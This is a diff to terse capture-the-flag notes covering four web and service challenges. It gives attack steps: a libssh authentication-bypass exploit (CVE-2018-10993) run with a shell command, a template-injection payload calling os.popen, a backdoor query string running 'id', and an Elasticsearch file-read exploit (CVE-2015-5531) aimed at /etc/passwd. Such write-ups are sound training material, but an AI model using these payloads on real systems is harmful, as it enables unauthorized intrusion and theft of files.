@@ -1,9 +1,7 @@
 # CyberSecurity
 
 
-
 libssh
-
 Flag format: CTF{sha256}
 Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
 libssh is a C library that enables you to write a program that uses the SSH protocol. With it, you can remotely execute programs, transfer files, or use a secure and transparent tunnel for your remote programs.
@@ -12,9 +10,7 @@ nmap –sV –sC –p port ip -Pn
 after scanning we can use CVE-2018-10993 libSSH authentication bypass exploit
 cve-2018-10993.py ip -p port -31367 -c "cd ..;cat flag.txt"
 ctf
-
 shark
-
 Flag format: CTF{sha256}
 Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
 curl is a command-line tool for getting or sending data including files using URL syntaxi
@@ -27,7 +23,6 @@ x=os.popen('cat flag').read()
 %>
 ${x}
 ctf
-
 nodiff-backdoor
 Flag format: CTF{sha256}
 Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
@@ -37,6 +32,15 @@ using wget command we can dowload //backup.zip
 if we search this file, we can find functions with vulnerabilities,
 after finding vulnerability we can use the backdoor to get the flag by using /?welldone=knockknock&shazam=id
 ctf
+elastic
+there is a vulnerabilty we can find using searchsploit elasticsearch 
+CVE-2015-5531- Arbitrary file Vulnerability. 
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+exploit.py ip /etc/passwd
+
+
+
+
 
 
 
